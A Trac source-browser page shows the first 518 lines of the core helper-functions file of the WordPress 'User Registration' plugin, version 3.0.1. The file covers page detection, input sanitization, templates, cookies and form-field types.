  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp â†—ï¸Ž](https://central.wordcamp.org/)
  + [Meetups â†—ï¸Ž](https://www.meetup.com/pro/wordpress/)
  + [Job Board â†—ï¸Ž](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg â†—ï¸Ž](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store â†—ï¸Ž](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fuser-registration%2Ftags%2F3.0.1%2Fincludes%2Ffunctions-ur-core.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/user-registration/tags/3.0.1/includes/functions-ur-core.php)

---

# [source:](/browser?order=name "Go to repository root") [user-registration](/browser/user-registration?order=name "View user-registration")/[tags](/browser/user-registration/tags?order=name "View tags")/[3.0.1](/browser/user-registration/tags/3.0.1?order=name "View 3.0.1")/[includes](/browser/user-registration/tags/3.0.1/includes?order=name "View includes")/[functions-ur-core.php](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?order=name "View functions-ur-core.php")

View diff against:

View revision:

| [Last change](/changeset/2925707/user-registration/tags/3.0.1/includes/functions-ur-core.php "View differences") on this file was [2925707](/changeset/2925707/ "View changeset 2925707"), checked in by wpeverestdev, [19 months ago](/timeline?from=2023-06-14T06%3A40%3A27Z&precision=second "See timeline at 06/14/2023 06:40:27 AM") |
| --- |
| Update to version 3.0.1 from GitHub |
| **File size:** 126.0 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\*\* |
| [3](#L3) | \* UserRegistration Functions. |
| [4](#L4) | \* |
| [5](#L5) | \* General core functions available on both the front-end and admin. |
| [6](#L6) | \* |
| [7](#L7) | \* @package UserRegistration/Functions |
| [8](#L8) | \* @version 1.0.0 |
| [9](#L9) | \*/ |
| [10](#L10) |  |
| [11](#L11) | defined(Â 'ABSPATH'Â )Â ||Â exit; |
| [12](#L12) |  |
| [13](#L13) | // Include core functions (available in both admin and frontend). |
| [14](#L14) | requireÂ UR\_ABSPATHÂ .Â 'includes/functions-ur-page.php'; |
| [15](#L15) | requireÂ UR\_ABSPATHÂ .Â 'includes/functions-ur-account.php'; |
| [16](#L16) | requireÂ UR\_ABSPATHÂ .Â 'includes/functions-ur-deprecated.php'; |
| [17](#L17) |  |
| [18](#L18) | /\*\* |
| [19](#L19) | \* Define a constant if it is not already defined. |
| [20](#L20) | \* |
| [21](#L21) | \* @param string $nameÂ  Constant name. |
| [22](#L22) | \* @param string $value Value. |
| [23](#L23) | \*/ |
| [24](#L24) | functionÂ ur\_maybe\_define\_constant(Â $name,Â $valueÂ )Â { |
| [25](#L25) | ifÂ (Â !Â defined(Â $nameÂ )Â )Â { |
| [26](#L26) | define(Â $name,Â $valueÂ ); |
| [27](#L27) | } |
| [28](#L28) | } |
| [29](#L29) |  |
| [30](#L30) | ifÂ (Â !Â function\_exists(Â 'is\_ur\_endpoint\_url'Â )Â )Â { |
| [31](#L31) |  |
| [32](#L32) | /\*\* |
| [33](#L33) | \* Check if an endpoint is showing. |
| [34](#L34) | \* |
| [35](#L35) | \* @param string $endpoint User registration myaccount endpoints. |
| [36](#L36) | \* |
| [37](#L37) | \* @return bool |
| [38](#L38) | \*/ |
| [39](#L39) | functionÂ is\_ur\_endpoint\_url(Â $endpointÂ =Â falseÂ )Â { |
| [40](#L40) | globalÂ $wp; |
| [41](#L41) |  |
| [42](#L42) | $ur\_endpointsÂ =Â UR()->query->get\_query\_vars(); |
| [43](#L43) |  |
| [44](#L44) | ifÂ (Â falseÂ !==Â $endpointÂ )Â { |
| [45](#L45) | ifÂ (Â !Â isset(Â $ur\_endpoints[Â $endpointÂ ]Â )Â )Â { |
| [46](#L46) | returnÂ false; |
| [47](#L47) | }Â elseÂ { |
| [48](#L48) | $endpoint\_varÂ =Â $ur\_endpoints[Â $endpointÂ ]; |
| [49](#L49) | } |
| [50](#L50) |  |
| [51](#L51) | returnÂ isset(Â $wp->query\_vars[Â $endpoint\_varÂ ]Â ); |
| [52](#L52) | }Â elseÂ { |
| [53](#L53) | foreachÂ (Â $ur\_endpointsÂ asÂ $keyÂ =>Â $valueÂ )Â { |
| [54](#L54) | ifÂ (Â isset(Â $wp->query\_vars[Â $keyÂ ]Â )Â )Â { |
| [55](#L55) | returnÂ true; |
| [56](#L56) | } |
| [57](#L57) | } |
| [58](#L58) |  |
| [59](#L59) | returnÂ false; |
| [60](#L60) | } |
| [61](#L61) | } |
| [62](#L62) | } |
| [63](#L63) |  |
| [64](#L64) | ifÂ (Â !Â function\_exists(Â 'is\_ur\_account\_page'Â )Â )Â { |
| [65](#L65) |  |
| [66](#L66) | /\*\* |
| [67](#L67) | \* Returns true when viewing an account page. |
| [68](#L68) | \* |
| [69](#L69) | \* @return bool |
| [70](#L70) | \*/ |
| [71](#L71) | functionÂ is\_ur\_account\_page()Â { |
| [72](#L72) | returnÂ is\_page(Â ur\_get\_page\_id(Â 'myaccount'Â )Â )Â ||Â ur\_post\_content\_has\_shortcode(Â 'user\_registration\_my\_account'Â )Â ||Â apply\_filters(Â 'user\_registration\_is\_account\_page',Â falseÂ ); |
| [73](#L73) | } |
| [74](#L74) | } |
| [75](#L75) |  |
| [76](#L76) | ifÂ (Â !Â function\_exists(Â 'is\_ur\_login\_page'Â )Â )Â { |
| [77](#L77) |  |
| [78](#L78) | /\*\* |
| [79](#L79) | \* Returns true when viewing an login page. |
| [80](#L80) | \* |
| [81](#L81) | \* @return bool |
| [82](#L82) | \*/ |
| [83](#L83) | functionÂ is\_ur\_login\_page()Â { |
| [84](#L84) | returnÂ is\_page(Â ur\_get\_page\_id(Â 'login'Â )Â )Â ||Â ur\_post\_content\_has\_shortcode(Â 'user\_registration\_login'Â )Â ||Â apply\_filters(Â 'user\_registration\_is\_login\_page',Â falseÂ ); |
| [85](#L85) | } |
| [86](#L86) | } |
| [87](#L87) |  |
| [88](#L88) | ifÂ (Â !Â function\_exists(Â 'is\_ur\_edit\_account\_page'Â )Â )Â { |
| [89](#L89) |  |
| [90](#L90) | /\*\* |
| [91](#L91) | \* Check for edit account page. |
| [92](#L92) | \* Returns true when viewing the edit account page. |
| [93](#L93) | \* |
| [94](#L94) | \* @return bool |
| [95](#L95) | \*/ |
| [96](#L96) | functionÂ is\_ur\_edit\_account\_page()Â { |
| [97](#L97) | globalÂ $wp; |
| [98](#L98) |  |
| [99](#L99) | returnÂ (Â is\_ur\_account\_page()Â &&Â isset(Â $wp->query\_vars['edit-password']Â )Â ); |
| [100](#L100) | } |
| [101](#L101) | } |
| [102](#L102) |  |
| [103](#L103) | ifÂ (Â !Â function\_exists(Â 'is\_ur\_lost\_password\_page'Â )Â )Â { |
| [104](#L104) |  |
| [105](#L105) | /\*\* |
| [106](#L106) | \* Returns true when viewing the lost password page. |
| [107](#L107) | \* |
| [108](#L108) | \* @return bool |
| [109](#L109) | \*/ |
| [110](#L110) | functionÂ is\_ur\_lost\_password\_page()Â { |
| [111](#L111) | globalÂ $wp; |
| [112](#L112) |  |
| [113](#L113) | returnÂ (Â is\_ur\_account\_page()Â &&Â isset(Â $wp->query\_vars['ur-lost-password']Â )Â ); |
| [114](#L114) | } |
| [115](#L115) | } |
| [116](#L116) |  |
| [117](#L117) | /\*\* |
| [118](#L118) | \* Clean variables using sanitize\_text\_field. Arrays are cleaned recursively. |
| [119](#L119) | \* Non-scalar values are ignored. |
| [120](#L120) | \* |
| [121](#L121) | \* @paramÂ  string|array $var Variable. |
| [122](#L122) | \* |
| [123](#L123) | \* @return string|array |
| [124](#L124) | \*/ |
| [125](#L125) | functionÂ ur\_clean(Â $varÂ )Â { |
| [126](#L126) | ifÂ (Â is\_array(Â $varÂ )Â )Â { |
| [127](#L127) | returnÂ array\_map(Â 'ur\_clean',Â $varÂ ); |
| [128](#L128) | }Â elseÂ { |
| [129](#L129) | returnÂ is\_scalar(Â $varÂ )Â ?Â sanitize\_text\_field(Â $varÂ )Â :Â $var; |
| [130](#L130) | } |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | /\*\* |
| [134](#L134) | \* Sanitize a string destined to be a tooltip. |
| [135](#L135) | \* |
| [136](#L136) | \* @sinceÂ  1.0.0Â  Tooltips are encoded with htmlspecialchars to prevent XSS. Should not be used in conjunction with esc\_attr() |
| [137](#L137) | \* |
| [138](#L138) | \* @paramÂ  string $var Value to sanitize. |
| [139](#L139) | \* |
| [140](#L140) | \* @return string |
| [141](#L141) | \*/ |
| [142](#L142) | functionÂ ur\_sanitize\_tooltip(Â $varÂ )Â { |
| [143](#L143) | returnÂ htmlspecialchars( |
| [144](#L144) | wp\_kses( |
| [145](#L145) | html\_entity\_decode(Â $varÂ ), |
| [146](#L146) | array( |
| [147](#L147) | 'br'Â  Â  Â =>Â array(), |
| [148](#L148) | 'em'Â  Â  Â =>Â array(), |
| [149](#L149) | 'strong'Â =>Â array(), |
| [150](#L150) | 'small'Â  =>Â array(), |
| [151](#L151) | 'span'Â  Â =>Â array(), |
| [152](#L152) | 'ul'Â  Â  Â =>Â array(), |
| [153](#L153) | 'li'Â  Â  Â =>Â array(), |
| [154](#L154) | 'ol'Â  Â  Â =>Â array(), |
| [155](#L155) | 'p'Â  Â  Â  =>Â array(), |
| [156](#L156) | ) |
| [157](#L157) | ) |
| [158](#L158) | ); |
| [159](#L159) | } |
| [160](#L160) |  |
| [161](#L161) | /\*\* |
| [162](#L162) | \* Format dimensions for display. |
| [163](#L163) | \* |
| [164](#L164) | \* @sinceÂ  1.7.0 |
| [165](#L165) | \* @paramÂ  array $dimensions Array of dimensions. |
| [166](#L166) | \* @paramÂ  array $unit Unit, defaults to 'px'. |
| [167](#L167) | \* @return string |
| [168](#L168) | \*/ |
| [169](#L169) | functionÂ ur\_sanitize\_dimension\_unit(Â $dimensionsÂ =Â array(),Â $unitÂ =Â 'px'Â )Â { |
| [170](#L170) | returnÂ ur\_array\_to\_string(Â ur\_suffix\_array(Â $dimensions,Â $unitÂ )Â ); |
| [171](#L171) | } |
| [172](#L172) |  |
| [173](#L173) | /\*\* |
| [174](#L174) | \* Add a suffix into an array. |
| [175](#L175) | \* |
| [176](#L176) | \* @sinceÂ  1.7.0 |
| [177](#L177) | \* @paramÂ  arrayÂ  $arrayÂ  Raw array data. |
| [178](#L178) | \* @paramÂ  string $suffix Suffix to be added. |
| [179](#L179) | \* @return array Modified array with suffix added. |
| [180](#L180) | \*/ |
| [181](#L181) | functionÂ ur\_suffix\_array(Â $arrayÂ =Â array(),Â $suffixÂ =Â ''Â )Â { |
| [182](#L182) | returnÂ preg\_filter(Â '/$/',Â $suffix,Â $arrayÂ ); |
| [183](#L183) | } |
| [184](#L184) | /\*\* |
| [185](#L185) | \* Implode an array into a string by $glue and remove empty values. |
| [186](#L186) | \* |
| [187](#L187) | \* @sinceÂ  1.7.0 |
| [188](#L188) | \* @paramÂ  arrayÂ  $array Array to convert. |
| [189](#L189) | \* @paramÂ  string $glueÂ  Glue, defaults to ' '. |
| [190](#L190) | \* @return string |
| [191](#L191) | \*/ |
| [192](#L192) | functionÂ ur\_array\_to\_string(Â $arrayÂ =Â array(),Â $glueÂ =Â ' 'Â )Â { |
| [193](#L193) | returnÂ is\_string(Â $arrayÂ )Â ?Â $arrayÂ :Â implode(Â $glue,Â array\_filter(Â $arrayÂ )Â ); |
| [194](#L194) | } |
| [195](#L195) | /\*\* |
| [196](#L196) | \* Explode a string into an array by $delimiter and remove empty values. |
| [197](#L197) | \* |
| [198](#L198) | \* @sinceÂ  1.7.0 |
| [199](#L199) | \* @paramÂ  string $stringÂ  Â  String to convert. |
| [200](#L200) | \* @paramÂ  string $delimiter Delimiter, defaults to ','. |
| [201](#L201) | \* @return array |
| [202](#L202) | \*/ |
| [203](#L203) | functionÂ ur\_string\_to\_array(Â $string,Â $delimiterÂ =Â ','Â )Â { |
| [204](#L204) | returnÂ is\_array(Â $stringÂ )Â ?Â $stringÂ :Â array\_filter(Â explode(Â $delimiter,Â $stringÂ )Â ); |
| [205](#L205) | } |
| [206](#L206) |  |
| [207](#L207) | /\*\* |
| [208](#L208) | \* Converts a string (e.g. 'yes' or 'no') to a bool. |
| [209](#L209) | \* |
| [210](#L210) | \* @param string $string String to convert. |
| [211](#L211) | \* @return bool |
| [212](#L212) | \*/ |
| [213](#L213) | functionÂ ur\_string\_to\_bool(Â $stringÂ )Â { |
| [214](#L214) | returnÂ is\_bool(Â $stringÂ )Â ?Â $stringÂ :Â (Â 'yes'Â ===Â $stringÂ ||Â 'on'Â ===Â $stringÂ ||Â 1Â ===Â $stringÂ ||Â 'true'Â ===Â $stringÂ ||Â '1'Â ===Â $stringÂ ||Â 'today'Â ===Â $stringÂ ||Â 'range'Â ===Â $stringÂ ); |
| [215](#L215) | } |
| [216](#L216) |  |
| [217](#L217) | /\*\* |
| [218](#L218) | \* Converts a bool to a 'yes' or 'no'. |
| [219](#L219) | \* |
| [220](#L220) | \* @param bool $bool String to convert. |
| [221](#L221) | \* @return string |
| [222](#L222) | \*/ |
| [223](#L223) | functionÂ ur\_bool\_to\_string(Â $boolÂ )Â { |
| [224](#L224) | ifÂ (Â !Â is\_bool(Â $boolÂ )Â )Â { |
| [225](#L225) | $boolÂ =Â ur\_string\_to\_bool(Â $boolÂ ); |
| [226](#L226) | } |
| [227](#L227) | returnÂ trueÂ ===Â $boolÂ ?Â 'yes'Â :Â 'no'; |
| [228](#L228) | } |
| [229](#L229) |  |
| [230](#L230) | /\*\* |
| [231](#L231) | \* Get other templates (e.g. my account) passing attributes and including the file. |
| [232](#L232) | \* |
| [233](#L233) | \* @param string $template\_name Template Name. |
| [234](#L234) | \* @param arrayÂ  $args Extra arguments(default: array()). |
| [235](#L235) | \* @param string $template\_path Path of template provided (default: ''). |
| [236](#L236) | \* @param string $default\_pathÂ  Default path of template provided(default: ''). |
| [237](#L237) | \*/ |
| [238](#L238) | functionÂ ur\_get\_template(Â $template\_name,Â $argsÂ =Â array(),Â $template\_pathÂ =Â '',Â $default\_pathÂ =Â ''Â )Â { |
| [239](#L239) | ifÂ (Â !Â empty(Â $argsÂ )Â &&Â is\_array(Â $argsÂ )Â )Â { |
| [240](#L240) | extract(Â $argsÂ );Â // phpcs:ignore |
| [241](#L241) | } |
| [242](#L242) |  |
| [243](#L243) | $locatedÂ =Â ur\_locate\_template(Â $template\_name,Â $template\_path,Â $default\_pathÂ ); |
| [244](#L244) |  |
| [245](#L245) | // Allow 3rd party plugin filter template file from their plugin. |
| [246](#L246) | $locatedÂ =Â apply\_filters(Â 'ur\_get\_template',Â $located,Â $template\_name,Â $args,Â $template\_path,Â $default\_pathÂ ); |
| [247](#L247) |  |
| [248](#L248) | ifÂ (Â !Â file\_exists(Â $locatedÂ )Â )Â { |
| [249](#L249) | \_doing\_it\_wrong(Â \_\_FUNCTION\_\_,Â sprintf(Â '<code>%s</code> does not exist.',Â esc\_html(Â $locatedÂ )Â ),Â '1.0'Â ); |
| [250](#L250) |  |
| [251](#L251) | return; |
| [252](#L252) | } |
| [253](#L253) |  |
| [254](#L254) | do\_action(Â 'user\_registration\_before\_template\_part',Â $template\_name,Â $template\_path,Â $located,Â $argsÂ ); |
| [255](#L255) |  |
| [256](#L256) | includeÂ $located; |
| [257](#L257) |  |
| [258](#L258) | do\_action(Â 'user\_registration\_after\_template\_part',Â $template\_name,Â $template\_path,Â $located,Â $argsÂ ); |
| [259](#L259) | } |
| [260](#L260) |  |
| [261](#L261) | /\*\* |
| [262](#L262) | \* Locate a template and return the path for inclusion. |
| [263](#L263) | \* |
| [264](#L264) | \* This is the load order: |
| [265](#L265) | \* |
| [266](#L266) | \*Â  Â  Â  Â  yourthemeÂ  Â  Â  Â  /Â  Â  $template\_pathÂ  Â  /Â  Â  $template\_name |
| [267](#L267) | \*Â  Â  Â  Â  yourthemeÂ  Â  Â  Â  /Â  Â  $template\_name |
| [268](#L268) | \*Â  Â  Â  Â  $default\_pathÂ  Â  /Â  Â  $template\_name |
| [269](#L269) | \* |
| [270](#L270) | \* @param string $template\_name Template Name. |
| [271](#L271) | \* @param string $template\_path Path of template provided (default: ''). |
| [272](#L272) | \* @param string $default\_pathÂ  Default path of template provided(default: ''). |
| [273](#L273) | \* |
| [274](#L274) | \* @return string |
| [275](#L275) | \*/ |
| [276](#L276) | functionÂ ur\_locate\_template(Â $template\_name,Â $template\_pathÂ =Â '',Â $default\_pathÂ =Â ''Â )Â { |
| [277](#L277) | ifÂ (Â !Â $template\_pathÂ )Â { |
| [278](#L278) | $template\_pathÂ =Â UR()->template\_path(); |
| [279](#L279) | } |
| [280](#L280) |  |
| [281](#L281) | ifÂ (Â !Â $default\_pathÂ )Â { |
| [282](#L282) | $default\_pathÂ =Â UR()->plugin\_path()Â .Â '/templates/'; |
| [283](#L283) | } |
| [284](#L284) |  |
| [285](#L285) | // Look within passed path within the theme - this is priority. |
| [286](#L286) | $templateÂ =Â locate\_template( |
| [287](#L287) | array( |
| [288](#L288) | trailingslashit(Â $template\_pathÂ )Â .Â $template\_name, |
| [289](#L289) | $template\_name, |
| [290](#L290) | ) |
| [291](#L291) | ); |
| [292](#L292) |  |
| [293](#L293) | // Get default template. |
| [294](#L294) | ifÂ (Â !Â $templateÂ ||Â UR\_TEMPLATE\_DEBUG\_MODEÂ )Â { |
| [295](#L295) | $templateÂ =Â $default\_pathÂ .Â $template\_name; |
| [296](#L296) | } |
| [297](#L297) |  |
| [298](#L298) | // Return what we found. |
| [299](#L299) | returnÂ apply\_filters(Â 'user\_registration\_locate\_template',Â $template,Â $template\_name,Â $template\_pathÂ ); |
| [300](#L300) | } |
| [301](#L301) |  |
| [302](#L302) | /\*\* |
| [303](#L303) | \* Display a UserRegistration help tip. |
| [304](#L304) | \* |
| [305](#L305) | \* @paramÂ  string $tipÂ  Â  Â  Â  Help tip text. |
| [306](#L306) | \* @paramÂ  boolÂ  Â $allow\_html Allow sanitized HTML if true or escape. |
| [307](#L307) | \* @param string $classname Classname. |
| [308](#L308) | \* |
| [309](#L309) | \* @return string |
| [310](#L310) | \*/ |
| [311](#L311) | functionÂ ur\_help\_tip(Â $tip,Â $allow\_htmlÂ =Â false,Â $classnameÂ =Â 'user-registration-help-tip'Â )Â { |
| [312](#L312) | ifÂ (Â $allow\_htmlÂ )Â { |
| [313](#L313) | $tipÂ =Â ur\_sanitize\_tooltip(Â $tipÂ ); |
| [314](#L314) | }Â elseÂ { |
| [315](#L315) | $tipÂ =Â esc\_attr(Â $tipÂ ); |
| [316](#L316) | } |
| [317](#L317) |  |
| [318](#L318) | returnÂ sprintf(Â '<span class="%s" data-tip="%s"></span>',Â $classname,Â $tipÂ ); |
| [319](#L319) | } |
| [320](#L320) |  |
| [321](#L321) | /\*\* |
| [322](#L322) | \* Checks whether the content passed contains a specific short code. |
| [323](#L323) | \* |
| [324](#L324) | \* @paramÂ  string $tag Shortcode tag to check. |
| [325](#L325) | \* |
| [326](#L326) | \* @return bool |
| [327](#L327) | \*/ |
| [328](#L328) | functionÂ ur\_post\_content\_has\_shortcode(Â $tagÂ =Â ''Â )Â { |
| [329](#L329) | globalÂ $post; |
| [330](#L330) | $new\_shortcodeÂ =Â ''; |
| [331](#L331) | $wp\_versionÂ  Â  =Â '5.0'; |
| [332](#L332) | ifÂ (Â version\_compare(Â $GLOBALS['wp\_version'],Â $wp\_version,Â '>='Â )Â )Â { |
| [333](#L333) | ifÂ (Â is\_object(Â $postÂ )Â )Â { |
| [334](#L334) | $blocksÂ =Â parse\_blocks(Â $post->post\_contentÂ ); |
| [335](#L335) | foreachÂ (Â $blocksÂ asÂ $blockÂ )Â { |
| [336](#L336) |  |
| [337](#L337) | ifÂ (Â (Â 'core/shortcode'Â ===Â $block['blockName']Â ||Â 'core/paragraph'Â ===Â $block['blockName']Â )Â &&Â isset(Â $block['innerHTML']Â )Â )Â { |
| [338](#L338) | $new\_shortcodeÂ =Â $block['innerHTML']; |
| [339](#L339) | }Â elseifÂ (Â 'user-registration/form-selector'Â ===Â $block['blockName']Â &&Â isset(Â $block['attrs']['shortcode']Â )Â )Â { |
| [340](#L340) | $new\_shortcodeÂ =Â '['Â .Â $block['attrs']['shortcode']Â .Â ']'; |
| [341](#L341) | } |
| [342](#L342) | } |
| [343](#L343) | } |
| [344](#L344) | returnÂ (Â is\_singular()Â ||Â is\_front\_page()Â )Â &&Â is\_a(Â $post,Â 'WP\_Post'Â )Â &&Â has\_shortcode(Â $new\_shortcode,Â $tagÂ ); |
| [345](#L345) | }Â elseÂ { |
| [346](#L346) | returnÂ (Â is\_singular()Â ||Â is\_front\_page()Â )Â &&Â is\_a(Â $post,Â 'WP\_Post'Â )Â &&Â has\_shortcode(Â $post->post\_content,Â $tagÂ ); |
| [347](#L347) | } |
| [348](#L348) | } |
| [349](#L349) |  |
| [350](#L350) | /\*\* |
| [351](#L351) | \* Wrapper for ur\_doing\_it\_wrong. |
| [352](#L352) | \* |
| [353](#L353) | \* @sinceÂ  1.0.0 |
| [354](#L354) | \* |
| [355](#L355) | \* @paramÂ  string $function Callback function name. |
| [356](#L356) | \* @paramÂ  string $message Message to display. |
| [357](#L357) | \* @paramÂ  string $version Version of the plugin. |
| [358](#L358) | \*/ |
| [359](#L359) | functionÂ ur\_doing\_it\_wrong(Â $function,Â $message,Â $versionÂ )Â { |
| [360](#L360) | $messageÂ .=Â ' Backtrace: 'Â .Â wp\_debug\_backtrace\_summary(); |
| [361](#L361) |  |
| [362](#L362) | ifÂ (Â defined(Â 'DOING\_AJAX'Â )Â )Â { |
| [363](#L363) | do\_action(Â 'doing\_it\_wrong\_run',Â $function,Â $message,Â $versionÂ ); |
| [364](#L364) | error\_log(Â "{$function}Â was called incorrectly. {$message}. This message was added in version {$version}."Â ); |
| [365](#L365) | }Â elseÂ { |
| [366](#L366) | \_doing\_it\_wrong(Â esc\_html(Â $functionÂ ),Â esc\_html(Â $messageÂ ),Â esc\_html(Â $versionÂ )Â ); |
| [367](#L367) | } |
| [368](#L368) | } |
| [369](#L369) |  |
| [370](#L370) | /\*\* |
| [371](#L371) | \* Set a cookie - wrapper for setcookie using WP constants. |
| [372](#L372) | \* |
| [373](#L373) | \* @paramÂ  stringÂ  $nameÂ  Â Name of the cookie being set. |
| [374](#L374) | \* @paramÂ  stringÂ  $valueÂ  Value of the cookie. |
| [375](#L375) | \* @paramÂ  integer $expire Expiry of the cookie. |
| [376](#L376) | \* @paramÂ  stringÂ  $secure Whether the cookie should be served only over https. |
| [377](#L377) | \*/ |
| [378](#L378) | functionÂ ur\_setcookie(Â $name,Â $value,Â $expireÂ =Â 0,Â $secureÂ =Â falseÂ )Â { |
| [379](#L379) | ifÂ (Â !Â headers\_sent()Â )Â { |
| [380](#L380) | setcookie(Â $name,Â $value,Â $expire,Â COOKIEPATHÂ ?Â COOKIEPATHÂ :Â '/',Â COOKIE\_DOMAIN,Â $secureÂ ); |
| [381](#L381) | }Â elseifÂ (Â defined(Â 'WP\_DEBUG'Â )Â &&Â WP\_DEBUGÂ )Â { |
| [382](#L382) | headers\_sent(Â $file,Â $lineÂ ); |
| [383](#L383) | trigger\_error(Â "{$name}Â cookie cannot be set - headers already sent by {$file}Â on line {$line}",Â E\_USER\_NOTICEÂ );Â //phpcs:ignore |
| [384](#L384) | } |
| [385](#L385) | } |
| [386](#L386) |  |
| [387](#L387) | /\*\* |
| [388](#L388) | \* Read in UserRegistration headers when reading plugin headers. |
| [389](#L389) | \* |
| [390](#L390) | \* @sinceÂ  1.1.0 |
| [391](#L391) | \* |
| [392](#L392) | \* @paramÂ  array $headers header. |
| [393](#L393) | \* |
| [394](#L394) | \* @return array $headers |
| [395](#L395) | \*/ |
| [396](#L396) | functionÂ ur\_enable\_ur\_plugin\_headers(Â $headersÂ )Â { |
| [397](#L397) | ifÂ (Â !Â class\_exists(Â 'UR\_Plugin\_Updates',Â falseÂ )Â )Â { |
| [398](#L398) | include\_onceÂ dirname(Â \_\_FILE\_\_Â )Â .Â '/admin/updater/class-ur-plugin-updates.php'; |
| [399](#L399) | } |
| [400](#L400) |  |
| [401](#L401) | $headers['URRequires']Â =Â UR\_Plugin\_Updates::VERSION\_REQUIRED\_HEADER; |
| [402](#L402) | $headers['URTested']Â  Â =Â UR\_Plugin\_Updates::VERSION\_TESTED\_HEADER; |
| [403](#L403) |  |
| [404](#L404) | returnÂ $headers; |
| [405](#L405) | } |
| [406](#L406) |  |
| [407](#L407) | add\_filter(Â 'extra\_plugin\_headers',Â 'ur\_enable\_ur\_plugin\_headers'Â ); |
| [408](#L408) |  |
| [409](#L409) | /\*\* |
| [410](#L410) | \* Set field type for all registrered field keys |
| [411](#L411) | \* |
| [412](#L412) | \* @paramÂ  string $field\_key field's field key. |
| [413](#L413) | \* @return string $field\_type |
| [414](#L414) | \*/ |
| [415](#L415) | functionÂ ur\_get\_field\_type(Â $field\_keyÂ )Â { |
| [416](#L416) | $fieldsÂ =Â ur\_get\_registered\_form\_fields(); |
| [417](#L417) |  |
| [418](#L418) | $field\_typeÂ =Â 'text'; |
| [419](#L419) |  |
| [420](#L420) | ifÂ (Â in\_array(Â $field\_key,Â $fieldsÂ )Â )Â { |
| [421](#L421) |  |
| [422](#L422) | switchÂ (Â $field\_keyÂ )Â { |
| [423](#L423) |  |
| [424](#L424) | caseÂ 'user\_email': |
| [425](#L425) | caseÂ 'user\_confirm\_email': |
| [426](#L426) | caseÂ 'email': |
| [427](#L427) | $field\_typeÂ =Â 'email'; |
| [428](#L428) | break; |
| [429](#L429) | caseÂ 'user\_confirm\_password': |
| [430](#L430) | caseÂ 'password': |
| [431](#L431) | caseÂ 'user\_pass': |
| [432](#L432) | $field\_typeÂ =Â 'password'; |
| [433](#L433) | break; |
| [434](#L434) | caseÂ 'user\_login': |
| [435](#L435) | caseÂ 'nickname': |
| [436](#L436) | caseÂ 'first\_name': |
| [437](#L437) | caseÂ 'last\_name': |
| [438](#L438) | caseÂ 'display\_name': |
| [439](#L439) | caseÂ 'text': |
| [440](#L440) | $field\_typeÂ =Â 'text'; |
| [441](#L441) | break; |
| [442](#L442) | caseÂ 'user\_url': |
| [443](#L443) | $field\_typeÂ =Â 'url'; |
| [444](#L444) | break; |
| [445](#L445) | caseÂ 'description': |
| [446](#L446) | caseÂ 'textarea': |
| [447](#L447) | $field\_typeÂ =Â 'textarea'; |
| [448](#L448) | break; |
| [449](#L449) | caseÂ 'select': |
| [450](#L450) | caseÂ 'country': |
| [451](#L451) | $field\_typeÂ =Â 'select'; |
| [452](#L452) | break; |
| [453](#L453) | caseÂ 'file': |
| [454](#L454) | $field\_typeÂ =Â 'file'; |
| [455](#L455) | break; |
| [456](#L456) | caseÂ 'privacy\_policy': |
| [457](#L457) | caseÂ 'mailchimp': |
| [458](#L458) | caseÂ 'mailerlite': |
| [459](#L459) | caseÂ 'checkbox': |
| [460](#L460) | $field\_typeÂ =Â 'checkbox'; |
| [461](#L461) | break; |
| [462](#L462) | caseÂ 'number': |
| [463](#L463) | $field\_typeÂ =Â 'number'; |
| [464](#L464) | break; |
| [465](#L465) | caseÂ 'date': |
| [466](#L466) | $field\_typeÂ =Â 'date'; |
| [467](#L467) | break; |
| [468](#L468) | caseÂ 'radio': |
| [469](#L469) | $field\_typeÂ =Â 'radio'; |
| [470](#L470) | break; |
| [471](#L471) | } |
| [472](#L472) | } |
| [473](#L473) |  |
| [474](#L474) | returnÂ apply\_filters(Â 'user\_registration\_field\_keys',Â $field\_type,Â $field\_keyÂ ); |
| [475](#L475) | } |
| [476](#L476) |  |
| [477](#L477) | /\*\* |
| [478](#L478) | \* Get user table fields. |
| [479](#L479) | \* |
| [480](#L480) | \* @return array |
| [481](#L481) | \*/ |
| [482](#L482) | functionÂ ur\_get\_user\_table\_fields()Â { |
| [483](#L483) | returnÂ apply\_filters( |
| [484](#L484) | 'user\_registration\_user\_table\_fields', |
| [485](#L485) | array( |
| [486](#L486) | 'user\_email', |
| [487](#L487) | 'user\_pass', |
| [488](#L488) | 'user\_login', |
| [489](#L489) | 'user\_url', |
| [490](#L490) | 'display\_name', |
| [491](#L491) | ) |
| [492](#L492) | ); |
| [493](#L493) | } |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Get required fields. |
| [497](#L497) | \* |
| [498](#L498) | \* @return array |
| [499](#L499) | \*/ |
| [500](#L500) | functionÂ ur\_get\_required\_fields()Â { |
| [501](#L501) | returnÂ apply\_filters( |
| [502](#L502) | 'user\_registration\_required\_form\_fields', |
| [503](#L503) | array( |
| [504](#L504) | 'user\_email', |
| [505](#L505) | 'user\_pass', |
| [506](#L506) | ) |
| [507](#L507) | ); |
| [508](#L508) | } |
| [509](#L509) |  |
| [510](#L510) | /\*\* |
| [511](#L511) | \* Get one time draggable fields fields. |
| [512](#L512) | \* |
| [513](#L513) | \* @return array |
| [514](#L514) | \*/ |
| [515](#L515) | functionÂ ur\_get\_one\_time\_draggable\_fields()Â { |
| [516](#L516) | $form\_fieldsÂ =Â ur\_get\_user\_field\_only(); |
| [517](#L517) | returnÂ apply\_filters(Â 'user\_registration\_one\_time\_draggable\_form\_fields',Â $form\_fieldsÂ ); |
| [518](#L518) | } |
